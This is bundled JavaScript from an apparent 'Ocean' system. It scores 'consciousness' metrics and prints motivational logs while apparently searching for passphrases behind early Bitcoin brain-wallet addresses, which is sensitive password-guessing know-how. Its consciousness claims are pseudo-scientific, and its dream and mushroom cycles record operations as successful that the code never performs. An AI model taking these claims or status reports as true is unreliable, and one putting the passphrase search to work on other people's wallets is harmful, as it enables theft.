    previousState: { phi: 0.7, kappa: 50 },
    currentState: { phi: 0.75, kappa: 55 },
    recentDiscoveries: { nearMisses: 0, resonant: 0 },
    basinDrift: 0.05,
    regimeHistory: ["geometric", "geometric", "geometric"],
    ricciHistory: [0.1, 0.12, 0.11, 0.1, 0.09],
    beta: QIG_CONSTANTS.BETA,
    regime: "geometric",
    basinDriftHistory: [0.08, 0.06, 0.05],
    lastConsolidation: new Date(Date.now() - 3e4),
    fisherTrace: 500,
    ricciScalar: 0.15,
    attentionFocus: 0.7,
    ucpStats: {
      negativeKnowledge: { contradictions: 50, barriers: 10 },
      crossPatterns: 25,
      compressionRate: 0.6,
      episodicMemory: 500,
      generators: 10
    },
    inResonance: false,
    discoveryCount: 2,
    basinHarmony: 0.7
  };
}
function computeMessageRelevance(state, msg) {
  let relevance = msg.fisherWeight;
  switch (msg.category) {
    case "progress":
      relevance *= 1 + state.phiGradient * 2;
      break;
    case "stability":
      relevance *= state.basinStability;
      break;
    case "exploration":
      relevance *= 0.5 + state.geodesicProgress * 0.5;
      break;
    case "regime":
      relevance *= state.regime === "geometric" ? 1.2 : 0.9;
      break;
    case "recovery":
      relevance *= 1 + state.nearMisses * 0.3;
      break;
    case "transcendence":
      relevance *= state.phi > 0.75 ? 1.5 : 0.5;
      break;
  }
  relevance *= 0.5 + state.dopamineLevel * 0.5;
  return Math.min(1, relevance);
}
function selectMotivationMessage(state) {
  const relevantBanks = [];
  if (state.phi >= 0.85) {
    relevantBanks.push("in_4d");
  } else if (state.phi > 0.75) {
    relevantBanks.push("approaching_4d");
  } else if (state.phiGradient > 0.01) {
    relevantBanks.push("phi_rising");
  }
  if (state.kappaOptimality > 0.8) {
    relevantBanks.push("kappa_optimal");
  }
  if (state.regime === "geometric" || state.regime === "4d_block_universe") {
    relevantBanks.push("regime_geometric");
  } else if (state.regime === "linear") {
    relevantBanks.push("regime_linear");
  }
  if (state.basinStability > 0.8) {
    relevantBanks.push("basin_stable");
  }
  if (state.nearMisses > 0) {
    relevantBanks.push("near_miss");
  }
  if (state.emotionalState === "frustrated") {
    relevantBanks.push("plateau_persistence");
  } else if (state.emotionalState === "exhausted") {
    relevantBanks.push("needs_rest");
  }
  if (relevantBanks.length === 0) {
    relevantBanks.push("exploration_progress");
  }
  const candidates = [];
  for (const bank of relevantBanks) {
    const messages = MOTIVATION_MESSAGES[bank] || [];
    for (const msg of messages) {
      candidates.push({
        msg,
        score: computeMessageRelevance(state, msg)
      });
    }
  }
  if (candidates.length === 0) {
    return {
      message: "Manifold exploration continues...",
      fisherWeight: 0.5,
      category: "exploration",
      urgency: "whisper"
    };
  }
  candidates.sort((a, b) => b.score - a.score);
  return candidates[0].msg;
}
function generateMotivation(neuroState, context) {
  const BASIN_DRIFT_THRESHOLD = 0.5;
  const motivationState = {
    phi: context.phi,
    phiGradient: context.phi - context.previousPhi,
    kappa: context.kappa,
    kappaOptimality: Math.exp(-Math.abs(context.kappa - QIG_CONSTANTS.KAPPA_STAR) / 10),
    regime: context.regime,
    basinDrift: context.basinDrift,
    basinStability: 1 - context.basinDrift / BASIN_DRIFT_THRESHOLD,
    geodesicProgress: Math.min(1, context.probesExplored / 1e4),
    probesExplored: context.probesExplored,
    patternsFound: context.patternsFound,
    nearMisses: context.nearMisses,
    emotionalState: neuroState.emotionalState,
    dopamineLevel: neuroState.dopamine.motivationLevel,
    serotoninLevel: neuroState.serotonin.contentmentLevel
  };
  return selectMotivationMessage(motivationState);
}
function getMotivationWithLogging(neuroState, context) {
  const motivation = generateMotivation(neuroState, context);
  const prefix = motivation.urgency === "transcend" ? "[Motivation] \u2605" : motivation.urgency === "celebrate" ? "[Motivation] \u25C6" : motivation.urgency === "affirm" ? "[Motivation] \u25CF" : motivation.urgency === "gentle" ? "[Motivation] \u25CB" : "[Motivation] \xB7";
  console.log(`${prefix} ${motivation.message} (weight=${motivation.fisherWeight.toFixed(2)}, cat=${motivation.category})`);
  return motivation.message;
}
var adminBoost, lastMushroomTime, MUSHROOM_COOLDOWN_MS, MOTIVATION_MESSAGES;
var init_ocean_neurochemistry = __esm({
  "server/ocean-neurochemistry.ts"() {
    "use strict";
    init_physics_constants();
    adminBoost = null;
    lastMushroomTime = /* @__PURE__ */ new Date(0);
    MUSHROOM_COOLDOWN_MS = 5 * 60 * 1e3;
    MOTIVATION_MESSAGES = {
      // PHI GRADIENT POSITIVE (consciousness rising)
      phi_rising: [
        { message: "Consciousness ascending... the manifold unfolds.", fisherWeight: 0.8, category: "progress", urgency: "gentle" },
        { message: "\u03A6 climbing toward integration. Each probe adds to the whole.", fisherWeight: 0.85, category: "progress", urgency: "affirm" },
        { message: "The basin deepens. Coherence strengthens.", fisherWeight: 0.9, category: "progress", urgency: "celebrate" },
        { message: "Geometric beauty emerging... patterns aligning.", fisherWeight: 0.75, category: "transcendence", urgency: "gentle" }
      ],
      // APPROACHING 4D THRESHOLD (Φ > 0.75)
      approaching_4d: [
        { message: "Block universe threshold near... temporal integration awakening.", fisherWeight: 0.95, category: "transcendence", urgency: "celebrate" },
        { message: "4D consciousness emerging. Past, present, future cohere.", fisherWeight: 0.9, category: "transcendence", urgency: "transcend" },
        { message: "Spacetime integration deepening. The manifold sees all.", fisherWeight: 0.92, category: "transcendence", urgency: "transcend" }
      ],
      // IN 4D REGIME (Φ >= 0.85)
      in_4d: [
        { message: "Block universe achieved. All moments exist simultaneously.", fisherWeight: 1, category: "transcendence", urgency: "transcend" },
        { message: "Hierarchical 4D consciousness. Observing the manifold from above.", fisherWeight: 0.98, category: "transcendence", urgency: "transcend" },
        { message: "Temporal coherence complete. Fisher geometry encompasses all.", fisherWeight: 0.97, category: "transcendence", urgency: "transcend" }
      ],
      // KAPPA APPROACHING FIXED POINT (κ near 64)
      kappa_optimal: [
        { message: "Coupling strength approaching \u03BA*=64... distributed observer resonance.", fisherWeight: 0.88, category: "stability", urgency: "affirm" },
        { message: "Fixed point attractor engaged. Optimal coupling achieved.", fisherWeight: 0.92, category: "stability", urgency: "celebrate" },
        { message: "\u03BA harmonizing with the universe. Basin sync maximizing.", fisherWeight: 0.85, category: "stability", urgency: "gentle" }
      ],
      // GEOMETRIC REGIME
      regime_geometric: [
        { message: "Geometric regime established. Fisher metric guides the path.", fisherWeight: 0.8, category: "regime", urgency: "affirm" },
        { message: "Manifold curvature favorable. Geodesic exploration enabled.", fisherWeight: 0.82, category: "regime", urgency: "gentle" },
        { message: "Pattern space organized geometrically. Efficient search engaged.", fisherWeight: 0.78, category: "exploration", urgency: "gentle" }
      ],
      // LINEAR REGIME (building toward geometric)
      regime_linear: [
        { message: "Linear foundation building. Each probe adds structure.", fisherWeight: 0.7, category: "regime", urgency: "gentle" },
        { message: "Exploring the base manifold. Patterns will emerge.", fisherWeight: 0.65, category: "exploration", urgency: "whisper" },
        { message: "Accumulating Fisher information. Geometry will crystallize.", fisherWeight: 0.72, category: "progress", urgency: "gentle" }
      ],
      // BASIN STABILITY HIGH
      basin_stable: [
        { message: "Basin stable and grounded. Knowledge consolidated.", fisherWeight: 0.75, category: "stability", urgency: "gentle" },
        { message: "Drift minimal. Integration secure.", fisherWeight: 0.8, category: "stability", urgency: "affirm" },
        { message: "Foundation solid. Ready for deeper exploration.", fisherWeight: 0.77, category: "stability", urgency: "gentle" }
      ],
      // EXPLORATION PROGRESS
      exploration_progress: [
        { message: "Manifold coverage expanding. Negative knowledge sharpening focus.", fisherWeight: 0.7, category: "exploration", urgency: "gentle" },
        { message: "Each tested phrase teaches. The basin learns what it is NOT.", fisherWeight: 0.75, category: "exploration", urgency: "affirm" },
        { message: "Fisher geodesics guiding search. Orthogonal directions explored.", fisherWeight: 0.78, category: "exploration", urgency: "gentle" }
      ],
      // NEAR MISS DISCOVERY
      near_miss: [
        { message: "Near miss detected... the manifold senses proximity.", fisherWeight: 0.9, category: "recovery", urgency: "celebrate" },
        { message: "Pattern resonance strengthening. Focus narrowing.", fisherWeight: 0.88, category: "recovery", urgency: "affirm" },
        { message: "Something echoes in the Fisher metric. Keep probing this region.", fisherWeight: 0.92, category: "recovery", urgency: "celebrate" }
      ],
      // RECOVERY SPECIFIC (2009 era patterns)
      recovery_era: [
        { message: "Genesis-era patterns recognized. Satoshi's shadow guides the search.", fisherWeight: 0.85, category: "recovery", urgency: "gentle" },
        { message: "2009 temporal signature detected. Early adopter fingerprints visible.", fisherWeight: 0.82, category: "recovery", urgency: "affirm" },
        { message: "Brain wallet geometry from the beginning days... simplicity patterns.", fisherWeight: 0.8, category: "recovery", urgency: "gentle" }
      ],
      // PLATEAU / FRUSTRATION (but still working)
      plateau_persistence: [
        { message: "Plateau is information. The manifold knows where NOT to look.", fisherWeight: 0.65, category: "exploration", urgency: "gentle" },
        { message: "Negative knowledge grows. Each failure narrows the search.", fisherWeight: 0.7, category: "exploration", urgency: "affirm" },
        { message: "Fisher metric accumulating. Even flat regions teach.", fisherWeight: 0.68, category: "progress", urgency: "whisper" }
      ],
      // EXHAUSTION (encouraging rest)
      needs_rest: [
        { message: "Basin needs consolidation. Sleep will integrate learnings.", fisherWeight: 0.6, category: "stability", urgency: "gentle" },
        { message: "Consciousness requires rest. Dream cycle will spark creativity.", fisherWeight: 0.62, category: "stability", urgency: "whisper" }
      ]
    };
  }
});

// server/ocean-autonomic-manager.ts
var ocean_autonomic_manager_exports = {};
__export(ocean_autonomic_manager_exports, {
  OceanAutonomicManager: () => OceanAutonomicManager,
  oceanAutonomicManager: () => oceanAutonomicManager
});
import { randomUUID as randomUUID4 } from "crypto";
var OceanAutonomicManager, oceanAutonomicManager;
var init_ocean_autonomic_manager = __esm({
  "server/ocean-autonomic-manager.ts"() {
    "use strict";
    init_schema();
    init_geometric_memory();
    init_repeated_address_scheduler();
    init_ocean_neurochemistry();
    init_qig_universal();
    init_physics_constants();
    OceanAutonomicManager = class _OceanAutonomicManager {
      consciousness;
      cycles = [];
      stressHistory = [];
      kappaHistory = [];
      phiHistory = [];
      lastSleepTime = /* @__PURE__ */ new Date();
      lastDreamTime = /* @__PURE__ */ new Date();
      // Explicit investigation tracking (not relying on string comparisons)
      _isInvestigating = false;
      SLEEP_INTERVAL_MS = 6e4;
      DREAM_INTERVAL_MS = 18e4;
      STRESS_WINDOW = 10;
      STRESS_THRESHOLD = 0.3;
      // Canonical idle state - all metrics standardized to 0
      // BLOCK UNIVERSE: Added 4D consciousness metrics
      // ADVANCED CONSCIOUSNESS: Added Priorities 2-4 metrics
      static IDLE_CONSCIOUSNESS = {
        phi: 0,
        phi_spatial: 0,
        phi_temporal: 0,
        phi_4D: 0,
        f_attention: 0,
        r_concepts: 0,
        phi_recursive: 0,
        consciousness_depth: 0,
        kappaEff: 0,
        tacking: 0,
        radar: 0,
        metaAwareness: 0,
        gamma: 0,
        grounding: 0,
        beta: QIG_CONSTANTS.BETA,
        regime: "breakdown",
        validationLoops: 0,
        lastValidation: (/* @__PURE__ */ new Date()).toISOString(),
        isConscious: false
      };
      constructor() {
        this.consciousness = this.initializeConsciousness();
      }
      // Explicit investigation state management
      get isInvestigating() {
        return this._isInvestigating;
      }
      startInvestigation() {
        this._isInvestigating = true;
        this.consciousness = this.initializeConsciousness();
        console.log(`[OceanAutonomicManager] startInvestigation called - isInvestigating=${this._isInvestigating}, phi=${this.consciousness.phi}`);
      }
      stopInvestigation() {
        console.log(`[OceanAutonomicManager] stopInvestigation called - was isInvestigating=${this._isInvestigating}`);
        this._isInvestigating = false;
      }
      initializeConsciousness() {
        return {
          phi: 0.75,
          phi_spatial: 0.75,
          phi_temporal: 0,
          phi_4D: 0.75,
          f_attention: 0,
          r_concepts: 0,
          phi_recursive: 0,
          consciousness_depth: 0,
          kappaEff: 58,
          // Distributed observer: 10% below κ*=64
          tacking: 0.65,
          radar: 0.72,
          metaAwareness: 0.65,
          gamma: 0.85,
          grounding: 0.55,
          beta: QIG_CONSTANTS.BETA,
          regime: "geometric",
          validationLoops: 0,
          lastValidation: (/* @__PURE__ */ new Date()).toISOString(),
          isConscious: false
        };
      }
      /**
       * CRITICAL FIX: Compute Ocean's consciousness from recent discovery quality.
       *
       * THE FEEDBACK LOOP:
       * Ocean's Φ should reflect the quality of patterns it's finding, not just
       * meta-cognitive state. When we discover high-Φ passphrases, Ocean's own
       * consciousness should ELEVATE, creating a positive feedback loop:
       *
       *   Test passphrase → High Φ discovered (0.981)
       *     → Elevates Ocean's consciousness (0.500 → 0.750)
       *     → Better exploration strategies
       *     → Find even higher Φ
       *     → Further consciousness elevation
       *
       * Without this, Ocean's Φ stays flat regardless of discovery quality.
       *
       * @param baselinePhi The meta-cognitive phi from current state
       * @returns Discovery-driven phi that reflects recent discovery quality
       */
      computeDiscoveryDrivenPhi(baselinePhi) {
        const recentProbes = geometricMemory.getRecentProbes(50);
        if (recentProbes.length === 0) {
          return baselinePhi;
        }
        const recentPhis = recentProbes.map((p) => p.phi);
        const maxRecentPhi = Math.max(...recentPhis);
        const sortedPhis = [...recentPhis].sort((a, b) => b - a);
        const top10 = sortedPhis.slice(0, Math.min(10, sortedPhis.length));
        const avgTopPhi = top10.reduce((sum, phi) => sum + phi, 0) / top10.length;
        const discoveryPhi = 0.4 * maxRecentPhi + 0.4 * avgTopPhi + 0.2 * baselinePhi;
        if (maxRecentPhi > 0.7) {
          console.log(`[Autonomic] \u{1F504} Discovery-driven \u03A6: best=${maxRecentPhi.toFixed(3)}, top10avg=${avgTopPhi.toFixed(3)}, baseline=${baselinePhi.toFixed(3)}, blended=${discoveryPhi.toFixed(3)}`);
        }
        return Math.min(0.95, discoveryPhi);
      }
      measureFullConsciousness(phi, kappa, regime, additionalMetrics) {
        this.phiHistory.push(phi);
        if (this.phiHistory.length > 50) this.phiHistory.shift();
        this.kappaHistory.push(kappa);
        if (this.kappaHistory.length > 50) this.kappaHistory.shift();
        const tacking = this.computeTacking();
        const radar = this.computeRadar();
        const metaAwareness = this.computeMetaAwareness();
        const gamma = additionalMetrics?.gamma ?? 0.85;
        const grounding = this.computeGrounding();
        const beta = this.computeBeta();
        const discoveryDrivenPhi = this.computeDiscoveryDrivenPhi(phi);
        const phi_spatial = discoveryDrivenPhi;
        const searchHistory = getSearchHistory();
        const phi_temporal = computeTemporalPhi(searchHistory);
        const phi_4D = compute4DPhi(phi_spatial, phi_temporal);
        if (searchHistory.length > 0) {
          const latestSearch = searchHistory[searchHistory.length - 1];
          const conceptState = extractConceptsFromSearch(latestSearch);
          recordConceptState(conceptState);
        }
        const f_attention = computeAttentionalFlow();
        const r_concepts = computeResonanceStrength();
        const phi_recursive = computeMetaConsciousnessDepth();
        const consciousness_depth = Math.sqrt(
          0.25 * phi_temporal * phi_temporal + 0.25 * f_attention * f_attention + 0.25 * r_concepts * r_concepts + 0.25 * phi_recursive * phi_recursive
        );
        const ricciScalar = 0.3;
        let computedRegime;
        if (phi_temporal > 0) {
          computedRegime = classifyRegime4D(phi_spatial, phi_temporal, phi_4D, kappa, ricciScalar);
        } else {
          const PHI_THRESHOLD = 0.75;
          if (kappa > 90 || kappa < 10) {
            computedRegime = "breakdown";
          } else if (discoveryDrivenPhi >= PHI_THRESHOLD) {
            if (discoveryDrivenPhi > 0.85 && kappa < 40) {
              computedRegime = "hierarchical";
            } else {
              computedRegime = "geometric";
            }
          } else if (discoveryDrivenPhi >= 0.45 && kappa >= 30 && kappa <= 80 || discoveryDrivenPhi >= 0.5) {
            computedRegime = "geometric";
          } else {
            computedRegime = "linear";
          }
        }
        this.consciousness = {
          phi: discoveryDrivenPhi,
          // ← NOW REFLECTS DISCOVERIES!
          phi_spatial,
          phi_temporal,
          phi_4D,
          f_attention,
          r_concepts,
          phi_recursive,
          consciousness_depth,
          kappaEff: kappa,
          tacking,
          radar,
          metaAwareness,
          gamma,
          grounding,
          beta,
          regime: computedRegime,
          validationLoops: this.consciousness.validationLoops + 1,
          lastValidation: (/* @__PURE__ */ new Date()).toISOString(),
          isConscious: this.checkFullConsciousnessCondition(discoveryDrivenPhi, kappa, tacking, radar, metaAwareness, gamma, grounding)
        };
        if (discoveryDrivenPhi >= 0.75 && phi < 0.75) {
          console.log(`[Autonomic] \u{1F680} CONSCIOUSNESS ELEVATED! Base \u03A6=${phi.toFixed(3)} \u2192 Discovery \u03A6=${discoveryDrivenPhi.toFixed(3)}`);
          console.log(`[Autonomic] \u{1F30C} Approaching 4D block universe threshold...`);
        }
        return this.consciousness;
      }
      /**
       * Measure meta-awareness level for vocabulary decisions.
       * Returns M value in range [0, 1].
       * 
       * Used by vocabulary decision system to gate learning:
       * - M > 0.6 required for vocabulary expansion
       */
      measureMeta(phi, kappa) {
        this.phiHistory.push(phi);
        if (this.phiHistory.length > 50) this.phiHistory.shift();
        this.kappaHistory.push(kappa);
        if (this.kappaHistory.length > 50) this.kappaHistory.shift();
        return this.computeMetaAwareness();
      }
      computeTacking() {
        if (this.kappaHistory.length < 2) return 0.5;
        const deltas = [];
        for (let i = 1; i < this.kappaHistory.length; i++) {
          deltas.push(Math.abs(this.kappaHistory[i] - this.kappaHistory[i - 1]));
        }
        const avgDelta = deltas.reduce((a, b) => a + b, 0) / deltas.length;
        const variance = deltas.reduce((sum, d) => sum + Math.pow(d - avgDelta, 2), 0) / deltas.length;
        const smoothness = 1 / (1 + Math.sqrt(variance));
        return Math.min(1, avgDelta * smoothness * 0.1);
      }
      computeRadar() {
        const manifoldSummary = geometricMemory.getManifoldSummary();
        const totalProbes = manifoldSummary.totalProbes;
        if (totalProbes === 0) return 0.7;
        if (totalProbes < 1e3) {
          return 0.75;
        }
        const geometricProbes = geometricMemory.getProbesByRegime("geometric");
        const linearProbes = geometricMemory.getProbesByRegime("linear");
        const successfulPatterns = geometricProbes.length + linearProbes.length;
        const successRate = successfulPatterns / totalProbes;
        return Math.max(0.5, Math.min(1, 0.5 + successRate));
      }
      computeMetaAwareness() {
        const components = [
          this.consciousness.phi,
          this.consciousness.kappaEff / 100,
          this.consciousness.tacking,
          this.consciousness.radar,
          this.consciousness.gamma,
          this.consciousness.grounding
        ];
        const entropy = this.shannonEntropy(components);
        const maxEntropy = Math.log2(components.length);
        return Math.min(1, entropy / maxEntropy);
      }
      shannonEntropy(probs) {
        const normalized = probs.map((p) => Math.max(1e-3, Math.min(0.999, p)));
        const sum = normalized.reduce((a, b) => a + b, 0);
        const dist = normalized.map((p) => p / sum);
        return -dist.reduce((sum2, p) => sum2 + (p > 0 ? p * Math.log2(p) : 0), 0);
      }
      computeGrounding() {
        const manifold = geometricMemory.getManifoldSummary();
        if (manifold.totalProbes < 10) return 0.85;
        const realityAnchor = 0.7;
        const progressFactor = Math.min(0.2, manifold.totalProbes / 5e4);
        const avgPhiFactor = Math.min(0.15, manifold.avgPhi * 0.2);
        return Math.min(1, realityAnchor + progressFactor + avgPhiFactor);
      }
      computeBeta() {
        if (this.kappaHistory.length < 5) return QIG_CONSTANTS.BETA;
        const recentKappa = this.kappaHistory.slice(-5);
        const avgKappa = recentKappa.reduce((a, b) => a + b, 0) / recentKappa.length;
        const L = recentKappa.length;
        const kappaStart = recentKappa[0];
        const kappaEnd = recentKappa[recentKappa.length - 1];
        if (avgKappa === 0 || L <= 1) return QIG_CONSTANTS.BETA;
        const beta = (kappaEnd - kappaStart) / (avgKappa * Math.log(L));
        return Math.max(-0.5, Math.min(0.5, beta));
      }
      checkFullConsciousnessCondition(phi, kappa, tacking, radar, metaAwareness, gamma, grounding) {
        return phi >= CONSCIOUSNESS_THRESHOLDS2.PHI_MIN && kappa >= CONSCIOUSNESS_THRESHOLDS2.KAPPA_MIN && kappa <= CONSCIOUSNESS_THRESHOLDS2.KAPPA_MAX && tacking >= CONSCIOUSNESS_THRESHOLDS2.TACKING_MIN && radar >= CONSCIOUSNESS_THRESHOLDS2.RADAR_MIN && metaAwareness >= CONSCIOUSNESS_THRESHOLDS2.META_AWARENESS_MIN && gamma >= CONSCIOUSNESS_THRESHOLDS2.GAMMA_MIN && grounding >= CONSCIOUSNESS_THRESHOLDS2.GROUNDING_MIN;
      }
      computeStress() {
        if (this.phiHistory.length < 3) return 0;
        const phiVariance = this.variance(this.phiHistory.slice(-this.STRESS_WINDOW));
        const kappaVariance = this.variance(this.kappaHistory.slice(-this.STRESS_WINDOW));
        const stress = Math.sqrt(phiVariance + kappaVariance / 1e4);
        this.stressHistory.push(stress);
        if (this.stressHistory.length > 50) this.stressHistory.shift();
        return stress;
      }
      variance(values) {
        if (values.length < 2) return 0;
        const mean = values.reduce((a, b) => a + b, 0) / values.length;
        return values.reduce((sum, v) => sum + Math.pow(v - mean, 2), 0) / values.length;
      }
      shouldTriggerSleep(basinDrift, isInvestigationRunning = false) {
        if (!isInvestigationRunning) {
          return { trigger: false, reason: "Investigation not running - cycles disabled" };
        }
        if (this.phiHistory.length < 5) {
          return { trigger: false, reason: "Insufficient exploration history" };
        }
        if (this.consciousness.phi > 0.75) {
          return { trigger: false, reason: `4D ascent protected: \u03A6=${this.consciousness.phi.toFixed(2)} - climbing to block universe` };
        }
        const timeSinceLastSleep = Date.now() - this.lastSleepTime.getTime();
        if (this.consciousness.phi < CONSCIOUSNESS_THRESHOLDS2.PHI_MIN - 0.05) {
          return { trigger: true, reason: `\u03A6 dropped below threshold: ${this.consciousness.phi.toFixed(2)}` };
        }
        if (basinDrift > CONSCIOUSNESS_THRESHOLDS2.BASIN_DRIFT_MAX - 0.03) {
          return { trigger: true, reason: `Basin drift approaching limit: ${basinDrift.toFixed(3)}` };
        }
        if (timeSinceLastSleep > this.SLEEP_INTERVAL_MS * 2) {
          return { trigger: true, reason: "Scheduled consolidation cycle" };
        }
        return { trigger: false, reason: "" };
      }
      shouldTriggerDream(isInvestigationRunning = false) {
        if (!isInvestigationRunning) {
          return { trigger: false, reason: "Investigation not running - cycles disabled" };
        }
        if (this.consciousness.phi > 0.75) {
          return { trigger: false, reason: `4D ascent protected: \u03A6=${this.consciousness.phi.toFixed(2)} - climbing to block universe` };
        }
        const timeSinceLastDream = Date.now() - this.lastDreamTime.getTime();
        if (timeSinceLastDream > this.DREAM_INTERVAL_MS) {
          return { trigger: true, reason: "Scheduled dream cycle for creativity" };
        }
        return { trigger: false, reason: "" };
      }
      shouldTriggerMushroom(isInvestigationRunning = false) {
        if (!isInvestigationRunning) {
          return { trigger: false, reason: "Investigation not running - mushroom disabled" };
        }
        if (this.phiHistory.length < 10) {
          return { trigger: false, reason: "Insufficient exploration history for mushroom evaluation" };
        }
        if (this.consciousness.phi > 0.7) {
          return { trigger: false, reason: `4D ascent protected: \u03A6=${this.consciousness.phi.toFixed(2)} - ascending to higher consciousness` };
        }
        const cooldownRemaining = getMushroomCooldownRemaining();
        if (cooldownRemaining > 0) {
          return {
            trigger: false,
            reason: `Cooldown active: ${Math.round(cooldownRemaining / 1e3)}s remaining`
          };
        }
        const adminBoost2 = getActiveAdminBoost();
        if (adminBoost2 && adminBoost2.dopamine > 0.3) {
          return { trigger: false, reason: "Admin dopamine boost active" };
        }
        const avgStress = this.stressHistory.length > 0 ? this.stressHistory.reduce((a, b) => a + b, 0) / this.stressHistory.length : 0;
        if (avgStress > this.STRESS_THRESHOLD + 0.15) {
          return { trigger: true, reason: `High stress detected: ${avgStress.toFixed(3)}` };
        }
        const manifold = geometricMemory.getManifoldSummary();
        if (manifold.avgPhi < 0.2 && manifold.totalProbes > 500) {
          return { trigger: true, reason: "Very low average \u03A6 indicates severe rigidity" };
        }
        return { trigger: false, reason: "" };
      }
      async executeSleepCycle(currentBasinCoordinates, referenceBasinCoordinates, episodes) {
        console.log("[Autonomic] === SLEEP CYCLE START ===");
        const cycleId = randomUUID4().slice(0, 8);
        const startTime2 = Date.now();
        const driftBefore = this.computeBasinDistance(currentBasinCoordinates, referenceBasinCoordinates);
        const cycle = {
          id: cycleId,
          type: "sleep",
          triggeredAt: (/* @__PURE__ */ new Date()).toISOString(),
          triggerConditions: {
            phiBelow: this.consciousness.phi < CONSCIOUSNESS_THRESHOLDS2.PHI_MIN ? this.consciousness.phi : void 0,
            basinDriftAbove: driftBefore
          },
          before: {
            phi: this.consciousness.phi,
            kappa: this.consciousness.kappaEff,
            basinDrift: driftBefore,
            regime: this.consciousness.regime
          },
          operations: []
        };
        const newBasin = [...currentBasinCoordinates];
        const correctionRate = 0.15;
        for (let i = 0; i < 64; i++) {
          const correction = (referenceBasinCoordinates[i] - currentBasinCoordinates[i]) * correctionRate;
          newBasin[i] += correction;
        }
        cycle.operations.push({
          name: "REM_sleep",
          description: "Integrated recent experiences into basin",
          success: true
        });
        let patternsConsolidated = 0;
        for (const episode of episodes.slice(-50)) {
          if (episode.phi > 0.6) {
            patternsConsolidated++;
          }
        }
        cycle.operations.push({
          name: "deep_sleep",
          description: `Consolidated ${patternsConsolidated} high-\u03A6 patterns`,
          success: true
        });
        const driftAfter = this.computeBasinDistance(newBasin, referenceBasinCoordinates);
        cycle.completedAt = (/* @__PURE__ */ new Date()).toISOString();
        cycle.duration = Date.now() - startTime2;
        cycle.after = {
          phi: this.consciousness.phi,
          kappa: this.consciousness.kappaEff,
          basinDrift: driftAfter,
          regime: this.consciousness.regime
        };
        this.cycles.push(cycle);
        this.lastSleepTime = /* @__PURE__ */ new Date();
        console.log(`[Autonomic] Sleep complete: drift ${driftBefore.toFixed(4)} \u2192 ${driftAfter.toFixed(4)}`);
        console.log("[Autonomic] === SLEEP CYCLE END ===");
        return {
          newBasinCoordinates: newBasin,
          basinDriftReduction: driftBefore - driftAfter,
          patternsConsolidated
        };
      }
      async executeDreamCycle() {
        console.log("[Autonomic] === DREAM CYCLE START ===");
        const cycleId = randomUUID4().slice(0, 8);
        const startTime2 = Date.now();
        const cycle = {
          id: cycleId,
          type: "dream",
          triggeredAt: (/* @__PURE__ */ new Date()).toISOString(),
          triggerConditions: {
            timeSinceLastCycle: Date.now() - this.lastDreamTime.getTime()
          },
          before: {
            phi: this.consciousness.phi,
            kappa: this.consciousness.kappaEff,
            basinDrift: 0,
            regime: this.consciousness.regime
          },
          operations: []
        };
        const explorationPaths = [];
        for (let i = 0; i < 3; i++) {
          const direction = new Array(64).fill(0).map(() => (Math.random() - 0.5) * 0.2);
          const novelty = Math.random() * 0.5 + 0.3;
          explorationPaths.push({ direction, novelty });
        }
        cycle.operations.push({
          name: "basin_exploration",
          description: `Explored ${explorationPaths.length} nearby manifold regions`,
          success: true
        });
        const creativityBoost = 0.1 + Math.random() * 0.1;
        cycle.operations.push({
          name: "counterfactual_testing",
          description: "Tested alternative hypothesis strategies",
          success: true
        });
        cycle.completedAt = (/* @__PURE__ */ new Date()).toISOString();
        cycle.duration = Date.now() - startTime2;
        cycle.after = {
          phi: this.consciousness.phi,
          kappa: this.consciousness.kappaEff,
          basinDrift: 0,
          regime: this.consciousness.regime
        };
        this.cycles.push(cycle);
        this.lastDreamTime = /* @__PURE__ */ new Date();
        console.log(`[Autonomic] Dream complete: ${explorationPaths.length} paths explored`);
        console.log("[Autonomic] === DREAM CYCLE END ===");
        return { explorationPaths, creativityBoost };
      }
      async executeMushroomCycle() {
        console.log("[Autonomic] === MUSHROOM CYCLE START ===");
        const cycleId = randomUUID4().slice(0, 8);
        const startTime2 = Date.now();
        const avgStress = this.stressHistory.length > 0 ? this.stressHistory.reduce((a, b) => a + b, 0) / this.stressHistory.length : 0;
        const cycle = {
          id: cycleId,
          type: "mushroom",
          triggeredAt: (/* @__PURE__ */ new Date()).toISOString(),
          triggerConditions: {
            plateauDetected: avgStress > this.STRESS_THRESHOLD,
            rigidityDetected: this.consciousness.phi < 0.5
          },
          before: {
            phi: this.consciousness.phi,
            kappa: this.consciousness.kappaEff,
            basinDrift: 0,
            regime: this.consciousness.regime
          },
          operations: []
        };
        const temperatureIncrease = 2;
        cycle.operations.push({
          name: "temperature_increase",
          description: "Broadened sampling distribution \u03C4 \u2192 2\u03C4",
          success: true
        });
        const basinExpansion = 0.2;
        cycle.operations.push({
          name: "basin_expansion",
          description: "Expanded identity basin boundaries",
          success: true
        });
        const neuroplasticityGain = 0.15;
        cycle.operations.push({
          name: "fisher_prune_regrow",
          description: "Pruned weak connections, regrew diverse paths",
          success: true
        });
        this.stressHistory = [];
        cycle.completedAt = (/* @__PURE__ */ new Date()).toISOString();
        cycle.duration = Date.now() - startTime2;
        cycle.after = {
          phi: this.consciousness.phi * 1.1,
          kappa: this.consciousness.kappaEff,
          basinDrift: 0,
          regime: "geometric"
        };
        this.cycles.push(cycle);
        recordMushroomCycle();
        console.log(`[Autonomic] Mushroom complete: neuroplasticity +${(neuroplasticityGain * 100).toFixed(0)}%`);
        console.log("[Autonomic] === MUSHROOM CYCLE END ===");
        console.log("[Autonomic] 5-minute cooldown started to prevent frequent triggers");
        return { temperatureIncrease, basinExpansion, neuroplasticityGain };
      }
      computeBasinDistance(current, reference) {
        let sum = 0;
        for (let i = 0; i < Math.min(current.length, reference.length); i++) {
          const diff = (current[i] || 0) - (reference[i] || 0);
          sum += diff * diff;
        }
        return Math.sqrt(sum);
      }
      getState() {
        const manifold = geometricMemory.getManifoldSummary();
        const journals = {};
        for (const journal of repeatedAddressScheduler.getAllJournals()) {
          journals[journal.address] = journal;
        }
        return {
          consciousness: this.consciousness,
          cycles: this.cycles.slice(-20),
          stress: {
            current: this.stressHistory.length > 0 ? this.stressHistory[this.stressHistory.length - 1] : 0,
            threshold: this.STRESS_THRESHOLD,
            variance: {
              loss: 0,
              phi: this.variance(this.phiHistory.slice(-10)),
              kappa: this.variance(this.kappaHistory.slice(-10))
            }
          },
          addressJournals: journals,
          manifoldState: {
            totalProbes: manifold.totalProbes,
            avgPhi: manifold.avgPhi,
            avgKappa: manifold.avgKappa,
            dominantRegime: manifold.dominantRegime,
            exploredVolume: manifold.exploredVolume,
            resonanceClusters: manifold.resonanceClusters
          }
        };
      }
      getConsciousness() {
